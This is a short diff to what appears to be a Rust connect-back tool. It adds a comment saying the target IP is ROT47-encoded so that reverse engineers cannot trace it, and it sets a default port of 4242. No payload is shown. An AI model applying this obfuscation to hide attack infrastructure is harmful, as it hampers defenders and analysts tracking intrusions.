@@ -7,7 +7,8 @@ use cienli::ciphers::rot::{Rot, RotType};
 fn main() {
     let five_seconds = time::Duration::from_millis(5000);
     let args: Vec<String> = std::env::args().collect();
-    let ipaddr_ciphered = Rot::new("`af]_]_]`", RotType::Rot47); //TARGET IP ENCODEDED WITH ROT47
+    // The IP address is encoded using the ROT47 technique for it not be revealed had someone wanted to reverse engineer this binary to track the target IP
+    let ipaddr_ciphered = Rot::new("`af]_]_]`", RotType::Rot47); // TARGET IP ENCODEDED WITH ROT47
     let ipaddr = ipaddr_ciphered.decipher();
 
     let port = if args.len() > 1 { args[1].clone() } else {String::from("4242")}; // Default port
